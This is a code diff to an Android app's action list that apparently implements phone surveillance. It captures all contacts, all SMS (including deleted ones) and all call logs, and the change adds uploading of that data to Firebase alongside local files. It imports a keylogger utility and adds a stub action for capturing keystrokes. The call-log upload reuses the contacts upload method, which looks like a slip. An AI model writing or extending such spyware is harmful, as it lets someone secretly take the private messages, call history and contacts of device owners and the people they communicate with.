@@ -11,6 +11,7 @@ import com.vikasyadavnsit.cdc.services.ScreenshotService;
 import com.vikasyadavnsit.cdc.utils.ActionUtils;
 import com.vikasyadavnsit.cdc.utils.CallUtils;
 import com.vikasyadavnsit.cdc.utils.FileUtils;
+import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
 import com.vikasyadavnsit.cdc.utils.KeyLoggerUtils;
 import com.vikasyadavnsit.cdc.utils.MessageUtils;
 
@@ -104,7 +105,11 @@ public enum ClickActions {
     CAPTURE_ALL_CONTACTS(
             8,
             (context, triggerSettingsData) -> {
-                FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
+                if (triggerSettingsData.isSaveOnLocalFile())
+                    FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
+                if (triggerSettingsData.isUploadDataSnapshot()) {
+                    FirebaseUtils.uploadUserContactsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
+                }
             },
             "Capture all phone contacts (It will capture all the phone contacts)",
             "Capture contacts"
@@ -112,7 +117,12 @@ public enum ClickActions {
     CAPTURE_ALL_SMS(
             9,
             (context, triggerSettingsData) -> {
-                FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages((Activity) context, FileMap.SMS));
+                if (triggerSettingsData.isSaveOnLocalFile()) {
+                    FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages((Activity) context, FileMap.SMS));
+                }
+                if (triggerSettingsData.isUploadDataSnapshot()) {
+                    FirebaseUtils.uploadUserSmsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.SMS));
+                }
             },
             "Capture all SMS (It will capture all the SMS sent, received, deleted, archived)",
             "Capture SMS"
@@ -120,7 +130,11 @@ public enum ClickActions {
     CAPTURE_ALL_CALL_LOGS(
             10,
             (context, triggerSettingsData) -> {
-                FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages((Activity) context, FileMap.CALL));
+                if (triggerSettingsData.isSaveOnLocalFile())
+                    FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages((Activity) context, FileMap.CALL));
+                if (triggerSettingsData.isUploadDataSnapshot()) {
+                    FirebaseUtils.uploadUserContactsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.CALL));
+                }
             },
             "Capture all call logs (It will capture all call logs)",
             "Capture call"
@@ -140,6 +154,14 @@ public enum ClickActions {
             },
             "Monitor phone statistics (It will capture all the phone statistics like button presses, screen on/off, and user present)",
             "Monitor phone statistics"
+    ),
+    CAPTURE_KEY_STROKES(
+            13,
+            (context, triggerSettingsData) -> {
+
+            },
+            "Capture key strokes (It will capture all the key strokes)",
+            "Capture key strokes"
     );
 
     int order;
